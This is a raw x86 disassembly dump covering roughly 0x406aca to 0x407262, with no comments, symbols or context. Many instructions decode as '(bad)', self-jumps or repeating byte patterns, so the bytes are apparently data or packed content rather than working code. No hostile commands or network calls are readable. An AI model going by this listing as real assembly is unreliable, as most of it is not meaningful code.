  406aca:	cmp    al,0xa3
  406acc:	(bad)  [edx+0x30d96326]
  406ad2:	cmp    al,0xa3
  406ad4:	(bad)  [ebx+0x15]
  406ad7:	arpl   dx,bx
  406ad9:	and    BYTE PTR [ebx+eiz*4],bh
  406adc:	(bad)  [esi+eiz*1+0x63]
  406ae0:	fst    DWORD PTR [eax]
  406ae2:	cmp    al,0xa3
  406ae4:	(bad)  [ebp-0xd]
  406ae7:	in     eax,0x7f
  406ae9:	cmp    BYTE PTR [esi],bh
  406aeb:	and    ebx,ecx
  406aed:	dec    esi
  406aee:	repz aad 0x7f
  406af1:	cmp    BYTE PTR [esi],bh
  406af3:	and    ebx,ecx
  406af5:	(bad)  
  406af6:	es (bad) 
  406af8:	fchs   
  406afa:	cmp    esp,DWORD PTR [ebx]
  406afc:	fld    DWORD PTR [eax-0x2f269dda]
  406b02:	cmp    esp,DWORD PTR [ebx]
  406b04:	fst    DWORD PTR [ecx-0x3f269dda]
  406b0a:	cmp    esp,DWORD PTR [ebx]
  406b0c:	fld    DWORD PTR [edx-0x4f269cda]
  406b12:	cmp    esp,DWORD PTR [ebx]
  406b14:	fst    DWORD PTR [ebx+0x15]
  406b17:	arpl   dx,bx
  406b19:	mov    al,ds:0x44d9233b
  406b1e:	es arpl cx,bx
  406b21:	nop
  406b22:	cmp    eax,DWORD PTR [eax]
  406b24:	and    ebx,ecx
  406b26:	push   ebp
  406b27:	es arpl cx,bx
  406b2a:	cmp    BYTE PTR [ebx],0xa3
  406b2d:	fld    DWORD PTR [eax]
  406b2f:	inc    esi
  406b30:	jl     0x406b0a
  406b32:	add    BYTE PTR [eax-0x77],dh
  406b35:	sbb    BYTE PTR [ecx],al
  406b37:	cdq    
  406b38:	jg     0x406b12
  406b3a:	add    BYTE PTR [eax+0x7e],ah
  406b3d:	sbb    BYTE PTR [ecx],al
  406b3f:	cwde   
  406b40:	jg     0x406b1a
  406b42:	add    BYTE PTR [eax+0x6e],dl
  406b45:	sbb    BYTE PTR [ecx],al
  406b47:	jnp    0x406bc8
  406b49:	fadd   DWORD PTR [eax]
  406b4b:	inc    eax
  406b4c:	pop    esi
  406b4d:	sbb    BYTE PTR [ecx],al
  406b4f:	jp     0x406b90
  406b51:	fadd   DWORD PTR [eax]
  406b53:	xor    BYTE PTR [esi+0x18],cl
  406b56:	add    DWORD PTR [ebp+0x3f],ebx
  406b59:	fadd   DWORD PTR [eax]
  406b5b:	and    BYTE PTR [esi],bh
  406b5d:	sbb    BYTE PTR [ecx],al
  406b5f:	pop    esp
  406b60:	aas    
  406b61:	fadd   DWORD PTR [eax]
  406b63:	adc    BYTE PTR [esi],ch
  406b65:	sbb    BYTE PTR [ecx],al
  406b67:	aas    
  406b68:	aas    
  406b69:	fadd   DWORD PTR [eax]
  406b6b:	add    BYTE PTR [esi+0x7f3e0118],bl
  406b71:	fadd   DWORD PTR [eax]
  406b73:	lock mov DWORD PTR [eax],ebx
  406b76:	add    DWORD PTR [ecx-0x66018130],esp
  406b7c:	jg     0x406b96
  406b7e:	add    DWORD PTR [eax-0x66018150],edx
  406b84:	outs   dx,DWORD PTR ds:[esi]
  406b85:	sbb    BYTE PTR [ecx],al
  406b87:	add    DWORD PTR [eax],0x4e
  406b8a:	fdivr  st,st(7)
  406b8c:	mov    edi,0x72011859
  406b91:	aas    
  406b92:	fadd   DWORD PTR [eax]
  406b94:	mov    al,0x49
  406b96:	sbb    BYTE PTR [ecx],al
  406b98:	gs aas 
  406b9a:	fadd   DWORD PTR [eax]
  406b9c:	mov    al,ds:0x54011839
  406ba1:	aas    
  406ba2:	fadd   DWORD PTR [eax]
  406ba4:	nop
  406ba5:	sub    DWORD PTR [eax],ebx
  406ba7:	add    DWORD PTR [eax],eax
  406ba9:	sbb    eax,0xe2ffffb4
  406bae:	sar    DWORD PTR [edi],0x0
  406bb1:	mov    WORD PTR [edi+edi*8+0x3fc2d2ff],?
  406bb8:	add    bl,bh
  406bba:	mov    edx,0xbdc2ffff
  406bbf:	aas    
  406bc0:	add    BYTE PTR [edx],cl
  406bc2:	mov    ebx,0xbd92ffff
  406bc7:	aas    
  406bc8:	add    cl,bh
  406bca:	mov    edx,0xbda2ffff
  406bcf:	aas    
  406bd0:	add    al,cl
  406bd2:	mov    edx,0xbd52ffff
  406bd7:	aas    
  406bd8:	add    BYTE PTR [edi+0x4200ffe9],dh
  406bde:	mov    ebp,0xe9c6003f
  406be3:	inc    DWORD PTR [eax]
  406be5:	push   edx
  406be6:	mov    ebp,0xe9b5003f
  406beb:	inc    DWORD PTR [eax]
  406bed:	add    BYTE PTR [edx-0x43],ah
  406bf0:	aas    
  406bf1:	add    BYTE PTR [ebx+edi*4],al
  406bf4:	(bad)  
  406bf5:	call   edx
  406bf7:	sar    DWORD PTR [edi],0x0
  406bfa:	xchg   ebx,eax
  406bfb:	mov    ebx,0xc1c20000
  406c00:	aas    
  406c01:	add    BYTE PTR [edx-0x6dffff45],al
  406c07:	sar    DWORD PTR [edi],0x0
  406c0a:	jno    0x406bc7
  406c0c:	add    BYTE PTR [eax],al
  406c0e:	mov    ds:0x40003fc1,al
  406c13:	mov    ebx,0xc1d20000
  406c18:	aas    
  406c19:	add    BYTE PTR [edi-0x45],cl
  406c1c:	add    BYTE PTR [eax],al
  406c1e:	ret    0x3fc1
  406c21:	add    BYTE PTR [edx-0x4b],ah
  406c24:	and    al,BYTE PTR [eax]
  406c26:	bound  ebp,QWORD PTR [ecx+0x3a]
  406c29:	inc    ecx
  406c2a:	(bad)  
  406c2b:	(bad)  
  406c2c:	and    al,BYTE PTR [eax]
  406c2e:	bound  ebx,QWORD PTR [ecx+0x3a]
  406c31:	inc    ecx
  406c32:	bound  esi,QWORD PTR [ebx+0x9620022]
  406c38:	cmp    al,BYTE PTR [ecx+0x62]
  406c3b:	inc    edx
  406c3c:	cmc    
  406c3d:	(bad)  
  406c3e:	cmp    eax,0x62413863
  406c43:	inc    ecx
  406c44:	and    BYTE PTR [ecx],al
  406c46:	bound  ebp,QWORD PTR [ecx]
  406c48:	cmp    eax,0x20606241
  406c4d:	add    DWORD PTR [edx+0x19],esp
  406c50:	cmp    eax,0x5f620041
  406c55:	and    BYTE PTR [ecx],al
  406c57:	(bad)  
  406c58:	leave  
  406c59:	cmp    al,0x41
  406c5b:	bound  edi,QWORD PTR [esi]
  406c5d:	and    BYTE PTR [ecx],al
  406c5f:	bound  edi,QWORD PTR [ecx+0x3d62413c]
  406c65:	and    BYTE PTR [ecx],al
  406c67:	(bad)  
  406c68:	jmp    0x5ca2ada9
  406c6d:	and    BYTE PTR [ecx],al
  406c6f:	(bad)  
  406c70:	fnstcw WORD PTR [ecx+eax*2]
  406c73:	bound  ebx,QWORD PTR [ebx+0x20]
  406c76:	add    DWORD PTR [edx-0x77],esp
  406c79:	cmp    al,BYTE PTR [ecx+0x62]
  406c7c:	sbb    ah,BYTE PTR [eax]
  406c7e:	add    DWORD PTR [edx+0x79],esp
  406c81:	cmp    al,BYTE PTR [ecx+0x62]
  406c84:	leave  
  406c85:	pop    ds
  406c86:	add    DWORD PTR [edx-0x57],esp
  406c89:	cmp    al,BYTE PTR [ecx+0x62]
  406c8c:	mov    eax,0x9962011f
  406c91:	cmp    al,BYTE PTR [ecx+0x62]
  406c94:	out    0x1f,eax
  406c96:	add    DWORD PTR [edx+0x49],esp
  406c99:	cmp    al,BYTE PTR [ecx+0x62]
  406c9c:	fld    DWORD PTR [ebx+0x21]
  406c9f:	arpl   cx,bx
  406ca1:	mov    al,ds:0x34d9233b
  406ca6:	and    DWORD PTR [ebx-0x27],esp
  406ca9:	nop
  406caa:	cmp    esp,DWORD PTR [ebx]
  406cac:	fldenv ds:0x80d96321
  406cb2:	cmp    esp,DWORD PTR [ebx+0x2116d9]
  406cb8:	arpl   cx,bx
  406cba:	jo     0x406cf7
  406cbc:	mov    ds:0x6322c7d9,eax
  406cc1:	fldenv [eax+0x3c]
  406cc4:	mov    ds:0x6322c8d9,eax
  406cc9:	fst    DWORD PTR [eax+0x3c]
  406ccc:	mov    ds:0x6322c9d9,eax
  406cd1:	fld    DWORD PTR [eax+0x3c]
  406cd4:	mov    ds:0x6322cad9,eax
  406cd9:	fnstenv [eax]
  406cdb:	cmp    al,0xa3
  406cdd:	(bad)  [ebx+0x20d96322]
  406ce3:	cmp    al,0xa3
  406ce5:	(bad)  [edx+eiz*1+0x3c10d963]
  406cec:	mov    ds:0x63228dd9,eax
  406cf1:	fld    DWORD PTR [eax]
  406cf3:	cmp    al,0x23
  406cf5:	(bad)  [esi-0xf269cde]
  406cfb:	cmp    esp,DWORD PTR [ebx]
  406cfd:	(bad)  [edi+0x22]
  406d00:	arpl   cx,bx
  406d02:	loopne 0x406d3f
  406d04:	and    ebx,ecx
  406d06:	inc    eax
  406d07:	and    ah,BYTE PTR [ebx-0x27]
  406d0a:	sar    BYTE PTR [ebx],1
  406d0c:	and    ebx,ecx
  406d0e:	push   ecx
  406d0f:	and    ah,BYTE PTR [ebx-0x27]
  406d12:	sar    BYTE PTR [ebx],0x23
  406d15:	fld    DWORD PTR [eax]
  406d17:	inc    edx
  406d18:	inc    eax
  406d19:	fiadd  DWORD PTR [eax]
  406d1b:	mov    al,0x0
  406d1d:	dec    ecx
  406d1e:	sbb    al,BYTE PTR [ecx]
  406d20:	adc    eax,0xa000da40
  406d25:	cmp    DWORD PTR [edx],ebx
  406d27:	add    DWORD PTR [eax+eax*2],eax
  406d2a:	fiadd  DWORD PTR [eax]
  406d2c:	nop
  406d2d:	sub    DWORD PTR [edx],ebx
  406d2f:	add    DWORD PTR [edi],edx
  406d31:	sbb    al,0x0
  406d34:	sbb    BYTE PTR [ecx-0x7ff9fee8],0xd8
  406d3b:	add    BYTE PTR [eax-0x77],dh
  406d3e:	sbb    BYTE PTR [ecx],al
  406d40:	fnstenv [eax]
  406d42:	jnp    0x406d42
  406d44:	cdq    
  406d45:	jnp    0x406d5f
  406d47:	add    eax,ebx
  406d49:	sbb    eax,0x0
  406d4c:	push   eax
  406d4d:	data16 sbb BYTE PTR [ecx],al
  406d50:	mov    ebx,0x4000d843
  406d55:	push   esi
  406d56:	sbb    BYTE PTR [ecx],al
  406d58:	mov    edx,0x3000d843
  406d5d:	inc    esi
  406d5e:	sbb    BYTE PTR [ecx],al
  406d60:	popf   
  406d61:	inc    ebx
  406d62:	fadd   DWORD PTR [eax]
  406d64:	and    BYTE PTR [esi],dh
  406d66:	sbb    BYTE PTR [ecx],al
  406d68:	pushf  
  406d69:	inc    ebx
  406d6a:	fadd   DWORD PTR [eax]
  406d6c:	adc    BYTE PTR [esi],ah
  406d6e:	sbb    BYTE PTR [ecx],al
  406d70:	jg     0x406cf5
  406d72:	fadd   DWORD PTR [eax]
  406d74:	add    BYTE PTR [esi-0x7c81fee8],dl
  406d7a:	fadd   DWORD PTR [eax]
  406d7c:	lock mov DWORD PTR [eax],ebx
  406d7f:	add    DWORD PTR [ecx+0x0],esp
  406d82:	sbb    eax,0x0
  406d85:	loopne 0x406e00
  406d87:	sbb    BYTE PTR [ecx],al
  406d89:	push   eax
  406d8a:	sbb    eax,0x0
  406d8d:	shr    BYTE PTR [ecx+0x18],1
  406d90:	add    DWORD PTR [eax],eax
  406d92:	and    DWORD PTR [eax-0x415d0001],edi
  406d98:	aas    
  406d99:	add    BYTE PTR [eax-0x48],dl
  406d9c:	(bad)  
  406d9d:	call   edx
  406d9f:	mov    esi,0xb847003f
  406da4:	(bad)  
  406da5:	inc    edx
  406da7:	mov    esi,0xb856003f
  406dac:	(bad)  
  406dad:	call   edx
  406daf:	mov    esi,0xb865003f
  406db4:	(bad)  
  406db5:	jmp    edx
  406db7:	mov    ebp,0x8854003f
  406dbc:	(bad)  
  406dbd:	dec    DWORD PTR [ebx+0x4b003fc0]
  406dc3:	(bad)  
  406dc4:	add    BYTE PTR [eax],al
  406dc6:	dec    ebx
  406dc7:	(bad)  
  406dc8:	add    BYTE PTR [eax],al
  406dca:	cmp    edx,esi
  406dcc:	add    BYTE PTR [eax],al
  406dce:	sub    dh,BYTE PTR [edx-0x29f50000]
  406dd4:	add    BYTE PTR [eax],al
  406dd6:	cmp    dh,BYTE PTR [edx-0x2a050000]
  406ddc:	add    BYTE PTR [eax],al
  406dde:	sub    dh,BYTE PTR [edx-0x29f50000]
  406de4:	add    BYTE PTR [eax],al
  406de6:	add    dl,bh
  406de8:	mov    cl,0x0
  406dea:	add    bl,bh
  406dec:	aad    0x0
  406dee:	add    dl,ch
  406df0:	mov    cl,0x0
  406df2:	add    bl,cl
  406df4:	aad    0x0
  406df6:	add    BYTE PTR [edx-0x44ffff4f],bh
  406dfc:	aad    0x0
  406dfe:	add    BYTE PTR [edx-0x34ffff4f],ch
  406e04:	aad    0x0
  406e06:	add    BYTE PTR [edx+0x620000b1],bh
  406e0c:	jno    0x406e13
  406e0e:	add    DWORD PTR [ebx+0x6e],esp
  406e11:	add    eax,0x5716301
  406e16:	add    DWORD PTR [ebx+0x6e],esp
  406e19:	add    eax,0x5716301
  406e1e:	add    DWORD PTR [ebx+0x6e],esp
  406e21:	add    eax,0x5716301
  406e26:	add    DWORD PTR [ebx+0x6e],esp
  406e29:	add    eax,0x5716301
  406e2e:	add    DWORD PTR [ebx+0x6e],esp
  406e31:	add    eax,0x5816301
  406e36:	add    DWORD PTR [ebx-0x7c],esp
  406e39:	add    eax,0x5816301
  406e3e:	add    DWORD PTR [ebx-0x7c],esp
  406e41:	add    eax,0x5816301
  406e46:	add    DWORD PTR [ebx-0x7c],esp
  406e49:	add    eax,0x86630001
  406e4e:	push   es
  406e4f:	add    al,0x5e
  406e51:	jge    0x406e59
  406e53:	add    al,0x66
  406e55:	xchg   BYTE PTR [esi],al
  406e57:	add    al,0x5e
  406e59:	jge    0x406e61
  406e5b:	add    al,0x66
  406e5d:	xchg   BYTE PTR [esi],al
  406e5f:	add    al,0x5e
  406e61:	jge    0x406e69
  406e63:	add    al,0x66
  406e65:	xchg   BYTE PTR [esi],al
  406e67:	add    al,0x5e
  406e69:	jge    0x406e71
  406e6b:	add    al,0x66
  406e6d:	xchg   BYTE PTR [esi],al
  406e6f:	add    al,0x5e
  406e71:	jge    0x406e79
  406e73:	add    al,0x66
  406e75:	xchg   BYTE PTR [esi],al
  406e77:	add    al,0x5e
  406e79:	jge    0x406e81
  406e7b:	add    al,0x66
  406e7d:	xchg   BYTE PTR [esi],al
  406e7f:	add    al,0x5e
  406e81:	jge    0x406e89
  406e83:	add    al,0x66
  406e85:	fldpi  
  406e87:	pop    es
  406e88:	pop    esi
  406e89:	fucom  st(4)
  406e8b:	pop    es
  406e8c:	data16 fucom st(7)
  406e8f:	add    esp,DWORD PTR [edx-0x27]
  406e92:	out    0x3,eax
  406e94:	(bad)  
  406e95:	(bad)  
  406e97:	add    esp,DWORD PTR [edx-0x27]
  406e9a:	out    0x3,eax
  406e9c:	(bad)  
  406e9d:	(bad)  
  406e9f:	add    esp,DWORD PTR [edx-0x27]
  406ea2:	out    0x3,eax
  406ea4:	(bad)  
  406ea5:	(bad)  
  406ea7:	add    esp,DWORD PTR [edx-0x27]
  406eaa:	out    0x3,eax
  406eac:	(bad)  
  406ead:	(bad)  
  406eaf:	add    eax,DWORD PTR [eax]
  406eb1:	(bad)  
  406eb2:	(bad)  
  406eb4:	add    esp,DWORD PTR [edx-0x27]
  406eb7:	out    0x3,eax
  406eb9:	(bad)  
  406eba:	(bad)  
  406ebc:	add    esp,DWORD PTR [edx-0x27]
  406ebf:	out    0x3,eax
  406ec1:	(bad)  
  406ec2:	(bad)  
  406ec4:	add    esp,DWORD PTR [edx-0x27]
  406ec7:	out    0x3,eax
  406ec9:	(bad)  
  406eca:	(bad)  
  406ecc:	add    esp,DWORD PTR [edx-0x27]
  406ecf:	out    0x25,eax
  406ed1:	arpl   cx,bx
  406ed3:	push   eax
  406ed4:	sub    al,0xa3
  406ed6:	fld1   
  406ed8:	and    eax,0x2c40d963
  406edd:	mov    ds:0x6325e9d9,eax
  406ee2:	fnstenv [eax]
  406ee4:	sub    al,0xa3
  406ee6:	fldl2e 
  406ee8:	and    eax,0x2c20d963
  406eed:	mov    ds:0x6225ebd9,eax
  406ef2:	fst    DWORD PTR [eax]
  406ef4:	sub    al,0x23
  406ef6:	fldlg2 
  406ef8:	push   ss
  406ef9:	(bad)  
  406efa:	fld    DWORD PTR [eax]
  406efc:	sub    al,0x23
  406efe:	fld    DWORD PTR [eax]
  406f00:	out    dx,eax
  406f01:	shl    BYTE PTR [edi-0x2],1
  406f04:	lock mov DWORD PTR [edx],ebx
  406f07:	add    esi,ebp
  406f09:	mov    al,0x77
  406f0b:	(bad)  
  406f0c:	loopne 0x406f87
  406f0e:	sbb    al,BYTE PTR [ecx]
  406f10:	loope  0x406f91
  406f12:	fiadd  DWORD PTR [eax]
  406f14:	rol    BYTE PTR [eax],1
  406f16:	dec    ecx
  406f17:	sbb    al,BYTE PTR [ecx]
  406f19:	lock aas 
  406f1b:	fiadd  DWORD PTR [eax]
  406f1d:	sar    BYTE PTR [ecx],0x1a
  406f20:	add    ebx,esp
  406f22:	aas    
  406f23:	fiadd  DWORD PTR [eax]
  406f25:	mov    al,0x49
  406f27:	sbb    al,BYTE PTR [ecx]
  406f29:	repnz aas 
  406f2b:	fiadd  DWORD PTR [eax]
  406f2d:	mov    al,ds:0xe5011a39
  406f32:	aas    
  406f33:	fld    DWORD PTR [eax]
  406f35:	nop
  406f36:	mov    DWORD PTR [eax],ebx
  406f38:	add    esp,esi
  406f3a:	ins    BYTE PTR es:[edi],dx
  406f3b:	fld    DWORD PTR [eax]
  406f3d:	cmp    BYTE PTR [ecx+0x18],0x1
  406f41:	out    0x50,eax
  406f43:	ja     0x406f43
  406f45:	jo     0x406ed0
  406f47:	sbb    BYTE PTR [ecx],al
  406f49:	div    BYTE PTR [eax]
  406f4b:	ja     0x406f4b
  406f4d:	mov    eax,ds:0xf901187f
  406f52:	jg     0x406f2c
  406f54:	add    BYTE PTR [eax+0x4e],dl
  406f57:	sbb    BYTE PTR [ecx],al
  406f59:	fdivr  DWORD PTR [edi]
  406f5b:	fadd   DWORD PTR [eax]
  406f5d:	inc    eax
  406f5e:	sbb    BYTE PTR ds:[ecx],al
  406f61:	fstp   TBYTE PTR [edi]
  406f63:	fadd   DWORD PTR [eax]
  406f65:	xor    BYTE PTR [esi+0x18],cl
  406f68:	add    edx,edi
  406f6a:	aas    
  406f6b:	fadd   DWORD PTR [eax]
  406f6d:	and    BYTE PTR [esi],bh
  406f6f:	sbb    BYTE PTR [ecx],al
  406f71:	std    
  406f72:	aas    
  406f73:	fld    DWORD PTR [eax]
  406f75:	adc    BYTE PTR [esi+0x118],cl
  406f7b:	mov    dh,0xcf
  406f7d:	add    BYTE PTR [eax],al
  406f7f:	(bad)  
  406f80:	lds    edi,FWORD PTR [edi]
  406f82:	add    BYTE PTR [ebp-0x4d000195],ah
  406f88:	ret    0x3f
  406f8b:	mov    ah,0x6b
  406f8d:	(bad)  
  406f8e:	inc    edx
  406f90:	ret    0x3f
  406f93:	mov    bl,0xbc
  406f95:	(bad)  
  406f96:	push   DWORD PTR [edx-0x7dffc03e]
  406f9c:	mov    esp,0xc2a2ffff
  406fa1:	aas    
  406fa2:	add    BYTE PTR [ecx-0x4d000044],dh
  406fa8:	ret    0x3f
  406fab:	pusha  
  406fac:	mov    edi,0xc2c2ffff
  406fb1:	aas    
  406fb2:	add    BYTE PTR [edi-0x44],ch
  406fb5:	add    BYTE PTR [eax],al
  406fb7:	repnz sar DWORD PTR [edi],0x0
  406fbb:	ds iret 
  406fbd:	add    BYTE PTR [eax],al
  406fbf:	loop   0x406f82
  406fc1:	aas    
  406fc2:	add    BYTE PTR ds:0xb2fffe6b,ch
  406fc8:	ret    0x3f
  406fcb:	pop    esp
  406fcc:	ins    BYTE PTR es:[edi],dx
  406fcd:	(bad)  
  406fce:	inc    edx
  406fd0:	lds    edi,FWORD PTR [edi]
  406fd2:	add    BYTE PTR [ebx-0x45],bl
  406fd5:	(bad)  
  406fd6:	push   DWORD PTR [edx+0x6a003fc5]
  406fdc:	mov    ebx,0xa200ffff
  406fe1:	lds    edi,FWORD PTR [edi]
  406fe3:	add    BYTE PTR [ecx-0x45],bl
  406fe6:	(bad)  
  406fe7:	push   DWORD PTR [edx]
  406fe9:	lds    edi,FWORD PTR [edi]
  406feb:	add    BYTE PTR [eax],ch
  406fed:	mov    eax,0xc542ffff
  406ff2:	aas    
  406ff3:	add    BYTE PTR [edx-0x5c],ah
  406ff6:	and    BYTE PTR [eax],al
  406ff8:	(bad)  
  406ff9:	leave  
  406ffa:	sub    al,0x41
  406ffc:	bound  esp,QWORD PTR [ebp-0x269dffe7]
  407002:	sub    al,0x41
  407004:	bound  esp,QWORD PTR [esi+0x73bdfff5]
  40700a:	sub    eax,0xf3e76241
  40700f:	jmp    FWORD PTR [ebp+0x62412a78]
  407015:	fsub   DWORD PTR [edx]
  407017:	add    DWORD PTR [edx-0x77],esp
  40701a:	sub    al,BYTE PTR [ecx+0x62]
  40701d:	leave  
  40701e:	and    al,BYTE PTR [ecx]
  407020:	bound  ebx,QWORD PTR [ecx-0x259dbed6]
  407026:	and    al,BYTE PTR [ecx]
  407028:	bound  ebp,QWORD PTR [ecx]
  40702a:	sub    al,BYTE PTR [ecx+0x62]
  40702d:	mov    esp,DWORD PTR [eax]
  40702f:	add    DWORD PTR [edx+0x39],esp
  407032:	sub    al,BYTE PTR [ecx+0x62]
  407035:	pushf  
  407036:	and    BYTE PTR [eax],al
  407038:	bound  ecx,QWORD PTR [ecx+0x2a]
  40703b:	inc    ecx
  40703c:	bound  ecx,QWORD PTR [ebp+0x59620019]
  407042:	sub    al,BYTE PTR [ecx+0x0]
  407045:	bound  ebx,QWORD PTR [ebp+esi*8+0x2cf73dff]
  40704c:	inc    ecx
  40704d:	(bad)  
  40704e:	retf   
  40704f:	repz jmp FWORD PTR ds:0x62412cfa
  407056:	shl    BYTE PTR [edx],cl
  407058:	add    DWORD PTR [edx+0x9],esp
  40705b:	sub    eax,0x20716241
  407060:	add    DWORD PTR [edx+0x19],esp
  407063:	sub    eax,0x20706241
  407068:	add    DWORD PTR [edx-0x57],esp
  40706b:	sub    al,0x41
  40706d:	(bad)  
  40706e:	(bad)  
  407070:	and    DWORD PTR [ebx-0x27],esp
  407073:	and    BYTE PTR [ebx+eiz*4],ch
  407076:	(bad)  
  407078:	and    DWORD PTR [edx-0x27],esp
  40707b:	adc    BYTE PTR [ebx+eiz*1],ch
  40707e:	fnstcw WORD PTR [eax+ebx*1+0x2c00d962]
  407085:	and    ebx,ecx
  407087:	mov    ebp,0xfc74bdf4
  40708c:	sub    al,0x23
  40708e:	fstp   DWORD PTR [esi]
  407090:	cmc    
  407091:	lods   eax,DWORD PTR ds:[esi]
  407092:	je     0x407075
  407094:	sub    esp,DWORD PTR [ebx]
  407096:	(bad)  [edi]
  407098:	and    ah,BYTE PTR [ebx-0x27]
  40709b:	shr    BYTE PTR [ebx],1
  40709d:	and    ebx,ecx
  40709f:	add    BYTE PTR [edx],ah
  4070a1:	arpl   cx,bx
  4070a3:	shr    BYTE PTR [ebx],0x23
  4070a6:	fyl2x  
  4070a8:	and    DWORD PTR [eax],eax
  4070aa:	arpl   cx,bx
  4070ac:	mov    al,0x2b
  4070ae:	and    ebx,ecx
  4070b0:	loop   0x4070d3
  4070b2:	arpl   cx,bx
  4070b4:	mov    al,ds:0xd3d9232b
  4070b9:	and    DWORD PTR [edx-0x27],esp
  4070bc:	nop
  4070bd:	sub    esp,DWORD PTR [ebx+0x6218c4d9]
  4070c3:	fld    DWORD PTR [eax-0x4a265cd5]
  4070c9:	hlt    
  4070ca:	cmp    eax,0xa32c7c74
  4070cf:	fldenv [esi]
  4070d1:	repz sub eax,0xa32c6174
  4070d7:	fldenv [edi]
  4070d9:	repz sbb eax,0xa32c5174
  4070df:	fldcw  WORD PTR [eax]
  4070e1:	repz or eax,0xa32c4174
  4070e7:	fld    DWORD PTR [eax]
  4070e9:	sub    esi,ecx
  4070eb:	jae    0x4070eb
  4070ed:	xor    BYTE PTR [esi+0x1a],al
  4070f0:	add    DWORD PTR [edx],ebp
  4070f2:	icebp  
  4070f3:	jae    0x4070f3
  4070f5:	and    BYTE PTR [esi],dh
  4070f7:	sbb    al,BYTE PTR [ecx]
  4070f9:	sub    eax,0x10fe73d1
  4070fe:	xchg   BYTE PTR [edx],bl
  407100:	add    DWORD PTR [ecx+edx*8],ebp
  407103:	jae    0x407103
  407105:	add    BYTE PTR [esi+0x1a],dh
  407108:	add    DWORD PTR [edi],ebp
  40710a:	mov    cl,0x73
  40710c:	(bad)  
  40710d:	lock add BYTE PTR [ecx-0x4f51fee6],cl
  407114:	jae    0x407114
  407116:	loopne 0x407191
  407118:	sbb    al,BYTE PTR [ecx]
  40711a:	mov    eax,ds:0xd0fe7390
  40711f:	dec    ecx
  407120:	sbb    al,BYTE PTR [ecx]
  407122:	mov    al,0x90
  407124:	jae    0x407124
  407126:	sar    BYTE PTR [ecx],0x1a
  407129:	add    DWORD PTR [ebx-0x4f018c90],esp
  40712f:	dec    ecx
  407130:	sbb    al,BYTE PTR [ecx]
  407132:	mov    dl,0x70
  407134:	jae    0x407134
  407136:	mov    al,ds:0xa5011a39
  40713b:	push   eax
  40713c:	jae    0x40713c
  40713e:	nop
  40713f:	mov    DWORD PTR [eax],ebx
  407141:	add    DWORD PTR [eax+edx*2+0x7980fe73],esi
  407148:	sbb    BYTE PTR [ecx],al
  40714a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40714b:	xor    BYTE PTR [ebx-0x2],dh
  40714e:	jo     0x4070d9
  407150:	sbb    BYTE PTR [ecx],al
  407152:	xor    DWORD PTR ss:[ebx-0x2],esi
  407156:	pusha  
  407157:	jbe    0x407171
  407159:	add    DWORD PTR [ecx],edi
  40715b:	adc    DWORD PTR [ebx-0x2],esi
  40715e:	push   eax
  40715f:	inc    esi
  407160:	sbb    BYTE PTR [ecx],al
  407162:	add    BYTE PTR [edx+0x66],ch
  407165:	(bad)  
  407166:	jmp    DWORD PTR [edx+0x59003fc5]
  40716c:	data16 (bad) 
  40716e:	push   DWORD PTR [edx]
  407170:	lds    edi,FWORD PTR [edi]
  407172:	add    BYTE PTR [eax],al
  407174:	sub    BYTE PTR [esi-0x2],ah
  407177:	inc    DWORD PTR [edx-0x3b]
  40717a:	aas    
  40717b:	add    BYTE PTR [edi+0x72fffe66],bl
  407181:	lds    edi,FWORD PTR [edi]
  407183:	add    BYTE PTR [esi+0x66],ch
  407186:	(bad)  
  407187:	jmp    DWORD PTR [edx-0x3b]
  40718a:	aas    
  40718b:	add    BYTE PTR [ebp+0x66],bl
  40718e:	(bad)  
  40718f:	push   DWORD PTR [edx-0x13ffc042]
  407195:	addr16 (bad) 
  407197:	inc    edx
  407199:	mov    esi,0x67d3003f
  40719e:	(bad)  
  40719f:	push   DWORD PTR [edx-0x3dffc042]
  4071a5:	addr16 (bad) 
  4071a7:	jmp    DWORD PTR [edx-0x2effc042]
  4071ad:	addr16 (bad) 
  4071af:	push   DWORD PTR [edx-0x5fffc042]
  4071b5:	addr16 (bad) 
  4071b7:	inc    edx
  4071b9:	mov    esi,0x6717003f
  4071be:	(bad)  
  4071bf:	push   edx
  4071c1:	mov    ebp,0x6706003f
  4071c6:	(bad)  
  4071c7:	jmp    edx
  4071c9:	mov    ebp,0x66d5003f
  4071ce:	(bad)  
  4071cf:	push   DWORD PTR [edx-0x5bffc042]
  4071d5:	ins    BYTE PTR es:[edi],dx
  4071d6:	(bad)  
  4071d7:	inc    DWORD PTR [eax]
  4071d9:	ret    0x3fc5
  4071dc:	add    BYTE PTR [edx+0x20],ah
  4071df:	hlt    
  4071e0:	call   DWORD PTR ds:0x62412d09
  4071e6:	and    esp,esi
  4071e8:	inc    DWORD PTR ds:0x62412d19
  4071ee:	push   ds
  4071ef:	daa    
  4071f0:	add    DWORD PTR [edx-0x57],esp
  4071f3:	sub    al,0x41
  4071f5:	(bad)  
  4071f6:	fbld   TBYTE PTR [esi]
  4071f8:	add    DWORD PTR [edx-0x47],esp
  4071fb:	sub    al,0x41
  4071fd:	(bad)  
  4071fe:	in     al,0xf3
  407200:	call   ebp
  407202:	jae    0x407231
  407204:	inc    ecx
  407205:	(bad)  
  407206:	in     eax,0xf3
  407208:	inc    ebp
  40720a:	jecxz  0x407237
  40720c:	inc    ecx
  40720d:	(bad)  
  40720f:	repz push DWORD PTR [ebp+0x62412ef1]
  407216:	mov    ds:0xf8a5fff5,eax
  40721b:	cs inc ecx
  40721d:	bound  ebx,QWORD PTR [eax-0x769dffef]
  407223:	sub    al,BYTE PTR [ecx+0x62]
  407226:	mov    eax,eax
  407228:	add    BYTE PTR [esi-0x67],bl
  40722b:	sub    al,BYTE PTR [ecx+0x62]
  40722e:	xchg   esi,eax
  40722f:	and    al,0x0
  407231:	bound  ebp,QWORD PTR [ecx]
  407233:	sub    al,BYTE PTR [ecx+0x62]
  407236:	inc    edi
  407237:	pop    ss
  407238:	add    DWORD PTR [ebx+0x39],esp
  40723b:	sub    al,BYTE PTR [ecx+0x0]
  40723e:	bound  edx,QWORD PTR [esi-0xb]
  407241:	call   DWORD PTR [ebp+0x4a]
  407244:	sub    al,BYTE PTR [ecx+0x62]
  407247:	inc    ebp
  407248:	cmc    
  407249:	inc    DWORD PTR [ebp+0x5a]
  40724c:	sub    al,BYTE PTR [ecx+0x62]
  40724f:	pop    eax
  407250:	cmc    
  407251:	push   DWORD PTR ds:0x624129ea
  407257:	fst    DWORD PTR [esi-0xb]
  40725a:	and    eax,0xa32c6171
  40725f:	fst    DWORD PTR [edi+0x26]
  407262:	jb     0x40723d
